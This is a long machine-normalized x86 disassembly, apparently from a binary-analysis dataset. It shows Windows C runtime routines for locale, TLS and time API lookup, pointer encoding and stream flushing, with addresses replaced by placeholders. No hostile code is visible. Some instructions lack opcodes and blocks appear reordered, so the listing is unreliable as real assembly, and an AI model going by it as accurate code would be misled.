mov edi esi
xor edi [ rw-data ]
call sub_42fb8e
pop ecx
and esi 0x1f
mov [ rw-data ] eax
mov ecx esi
ror edi cl
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_42fe7c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x2d
jb r-xdata
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_42febf
mov edi edi
push ebp
mov ebp esp
push esi
call sub_42fee2
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_42fe7c
pop ecx
mov esi eax
call sub_42fef5
mov [ eax ] esi
pop esi
pop ebp
retn
sub_42ff08
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
call sub_42fee2
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
call sub_42fdcf
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_42ff2d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
call sub_42fef5
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
call sub_42fdcf
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_42ff52
mov edi edi
push ebp
mov ebp esp
call sub_42faa1
test eax eax
jne r-xdata
call sub_42fee2
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_42ff73
mov edi edi
push ebp
mov ebp esp
call sub_42faa1
test eax eax
jne r-xdata
call sub_42fef5
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_42ff94
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ rw-data ]
mov ecx esi
xor esi [ rw-data ]
and ecx 0x1f
push 0x0
push 0x0
push [ ebp + 0x8 ]
ror esi cl
mov ecx esi
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
sub_42fff2
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
push [ eax ]
call sub_4300b4
pop ecx
mov [ rw-data ] eax
push 0x1
push sub_42ff94
call [ EnumSystemLocalesW@IAT ]
mov esi eax
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov [ rw-data ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43006a
mov eax esi
call sub_40d2a6
retn 0xc
sub_430076
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42fff2
mov esp ebp
pop ebp
retn
sub_4300b4
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_430116
mov eax [ ecx ]
push [ eax ]
call sub_4300b4
pop ecx
push 0x1
push sub_42ff94
mov [ rw-data ] eax
call [ EnumSystemLocalesW@IAT ]
mov edx [ rw-data ]
and edx 0x1f
push 0x20
pop ecx
sub ecx edx
xor edx edx
ror edx cl
xor edx [ rw-data ]
mov [ rw-data ] edx
retn
sub_43015a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4300b4
pop ecx
push 0x1
push sub_42ff94
mov [ rw-data ] eax
call [ EnumSystemLocalesW@IAT ]
mov edx [ rw-data ]
and edx 0x1f
push 0x20
pop ecx
sub ecx edx
xor edx edx
ror edx cl
xor edx [ rw-data ]
mov [ rw-data ] edx
pop ebp
retn
sub_4304de
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
push [ esi ]
call sub_43059e
pop ecx
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebp
retn
add esi 0x4
sub_430502
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
mov edx [ rw-data ]
or edi 0xffffffff
mov ecx edx
mov esi edx
and ecx 0x1f
xor esi eax
ror esi cl
cmp esi edi
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov esi [ ebp + 0x10 ]
cmp esi [ ebp + 0x14 ]
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
push [ esi ]
call sub_43059e
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax edx
push 0x20
and eax 0x1f
pop ecx
sub ecx eax
ror edi cl
xor edi edx
xchg [ ebx ] edi
push [ ebp + 0xc ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
add esi 0x4
cmp esi [ ebp + 0x14 ]
jne r-xdata
mov edx [ rw-data ]
push esi
call sub_40fed5
pop ecx
xchg [ ebx ] eax
jmp r-xdata
test eax eax
je r-xdata
mov edx [ rw-data ]
sub_43059e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push edi
lea edi [ eax * 4 + rw-data ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
push ebx
mov ebx [ eax * 4 + r--data ]
push esi
push 0x800
push 0x0
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
neg eax
sbb eax eax
and eax ecx
jmp r-xdata
mov eax esi
xchg [ edi ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
pop edi
pop ebp
retn
mov eax esi
push esi
call [ FreeLibrary@IAT ]
xor esi esi
push esi
push esi
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
jmp r-xdata
or eax 0xffffffff
xchg [ edi ] eax
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
pop esi
pop ebx
sub_430619
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
push [ esi ]
call sub_43059e
pop ecx
test eax eax
jne r-xdata
xor eax eax
pop esi
test eax eax
jne r-xdata
add esi 0x4
push [ ebp + 0x8 ]
push eax
call [ GetProcAddress@IAT ]
pop ebp
retn
pop ebp
retn
sub_43064d
mov edi edi
push ebp
mov ebp esp
push 0x800
push 0x0
push [ ebp + 0x8 ]
call [ LoadLibraryExW@IAT ]
test eax eax
jne r-xdata
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
xor eax eax
push 0x0
push 0x0
push [ ebp + 0x8 ]
call [ LoadLibraryExW@IAT ]
pop ebp
retn
sub_430684
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x0
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
xor eax eax
inc eax
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
sub_4306d2
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_4301b8
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_430de7
push eax
call [ CompareStringW@IAT ]
push [ ebp + 0x28 ]
mov ecx esi
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x24
sub_430746
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x2
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x4
call sub_430076
pop ecx
pop ecx
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
sub_4307b3
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x3
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
sub_430809
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x4
call sub_430502
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsFree@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
sub_43085f
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x5
call sub_430502
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsGetValue@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
sub_4308b5
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x6
call sub_430502
add esp 0x10
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsSetValue@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x8
sub_43090e
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x9
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_430de7
push eax
call [ GetDateFormatW@IAT ]
push [ ebp + 0x20 ]
mov ecx esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x1c
sub_430990
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0xa
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call sub_42d153
mov ecx esi
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
sub_4309df
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0xb
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x78
call [ SetLastError@IAT ]
xor eax eax
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
sub_430a42
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0xd
call sub_430502
add esp 0x10
mov esi eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_430de7
push eax
call [ GetLocaleInfoW@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
sub_430aac
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0xf
call sub_430502
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ GetSystemTimeAsFileTime@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
sub_430b02
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x10
call sub_430502
add esp 0x10
mov esi eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_430de7
push eax
call [ GetTimeFormatW@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x18
sub_430b72
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x11
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetUserDefaultLCID@IAT ]
push eax
call sub_430cf5
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x8
sub_430bd9
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x13
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call sub_42d153
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x8
sub_430c30
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x14
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0xc
sub_430c92
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x15
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x1
push 0x0
push [ ebp + 0x8 ]
call sub_430de7
push eax
call [ IsValidLocale@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
sub_430cf5
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x17
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43dddb
add esp 0xc
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
sub_430d5f
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x16
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_430de7
push eax
call [ LCMapStringW@IAT ]
push [ ebp + 0x28 ]
mov ecx esi
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x24
sub_430de7
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x18
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call sub_43de85
pop ecx
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x8
sub_430e43
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_430428
mov esi eax
test esi esi
je r-xdata
call sub_42d153
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0xc
sub_430e89
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_430442
mov esi eax
test esi esi
je r-xdata
call sub_42d153
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
sub_430ed2
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_43045c
mov esi eax
test esi esi
je r-xdata
call sub_42d153
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x10
sub_430f1b
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x1c
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
sub_430f6d
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x1d
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ecx esi
call [ r--data ]
call esi
sub_430fb6
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x1f
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call sub_42d153
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x8
sub_43100d
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x1e
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
sub_431090
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x7
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
push edi
mov ecx esi
call [ r--data ]
call esi
mov edi eax
test edi edi
je r-xdata
pop edi
push r--data
push r--data
push r--data
push 0xc
call sub_430502
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
push edi
mov ecx esi
call [ r--data ]
call esi
mov eax edi
jmp r-xdata
sub_43110f
mov eax [ rw-data ]
push edi
push 0x20
and eax 0x1f
mov edi rw-data
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
push 0x20
pop ecx
[ edi ]
mov al 0x1
pop edi
retn
sub_431135
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0xe
call sub_430502
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
push ebx
push r--data
push r--data
push r--data
push 0x12
call sub_430502
mov ebx eax
add esp 0x10
test ebx ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov ecx esi
call [ r--data ]
call esi
mov ecx eax
test ecx ecx
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
xor al al
jmp r-xdata
push edi
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
push 0x0
push 0xc
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push ecx
mov ecx ebx
call [ r--data ]
call ebx
pop edi
test eax eax
jne r-xdata
pop ebx
mov al [ ebp - 0x8 ]
and al 0x1
sub_4311db
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push esi
push r--data
push r--data
push r--data
push 0x8
call sub_430502
mov esi eax
add esp 0x10
test esi esi
je r-xdata
xor eax eax
cmp ecx 0x1
sete al
jmp r-xdata
push 0x2
pop eax
mov ecx rw-data
xchg [ ecx ] eax
xor al al
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push 0x0
push eax
mov ecx esi
call [ r--data ]
call esi
cmp eax 0x7a
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
xor ecx ecx
mov edx rw-data
inc ecx
xchg [ edx ] ecx
mov al 0x1
jmp r-xdata
pop esi
sub_431262
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
push esi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jne r-xdata
cmp [ esi ] 0xffffffff
je r-xdata
cmp [ esi ] 0x0
je r-xdata
pop esi
and [ esi ] 0x0
push [ esi ]
call [ FreeLibrary@IAT ]
sub_4312a8
push 0x10
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
push 0x8
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43133f
mov eax [ ebp - 0x1c ]
call sub_40d2a6
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
mov eax [ eax + 0xc ]
shr eax 0xd
test al 0x1
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_42d0aa
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_4177a4
pop ecx
cmp eax 0xffffffff
je r-xdata
inc [ ebp - 0x1c ]
sub_431361
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add edx 0xc
not esi
mov eax [ edx ]
mov ecx eax
and ecx esi
[ edx ] ecx
jne r-xdata
and eax [ ebp + 0x8 ]
neg eax
pop esi
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_43138b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov eax [ ecx + 0x4 ]
lea esi [ ecx + 0xc ]
mov edi [ ecx ]
and [ ecx + 0x8 ] 0x0
sub edi eax
mov [ ecx ] eax
mov eax [ esi ]
and al 0x3
cmp al 0x2
jne r-xdata
xor eax eax
mov eax [ esi ]
test al 0xc0
je r-xdata
test edi edi
jle r-xdata
push edi
push [ ecx + 0x4 ]
push ecx
call sub_432468
pop ecx
push eax
call sub_432a6c
add esp 0xc
cmp edi eax
je r-xdata
mov eax [ esi ]
shr eax 0x2
test al 0x1
je r-xdata
push 0x10
pop eax
[ esi ] eax
or eax 0xffffffff
jmp r-xdata
push 0xfffffffd
pop eax
[ esi ] eax
pop edi
pop esi
pop ebp
retn
sub_4313ef
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_43138b
pop ecx
test eax eax
je r-xdata
push esi
call sub_43143f
pop ecx
jmp r-xdata
mov eax [ esi + 0xc ]
shr eax 0xb
test al 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_432468
push eax
call sub_43e00c
pop ecx
pop ecx
test eax eax
jne r-xdata
sub_43143f
push 0x1c
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
